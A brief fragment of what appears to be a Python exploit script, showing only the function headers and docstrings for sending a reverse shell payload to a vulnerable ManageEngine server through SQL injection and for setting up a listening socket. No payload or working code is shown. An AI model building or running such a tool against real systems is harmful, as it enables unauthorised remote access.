...
def sendRevShell(target, revshell, event):
    """
    Sends the reverse shell payload to a vulnerable ManageEngine instance via SQLi.
...
def setupSocketServer(port, event):
    """
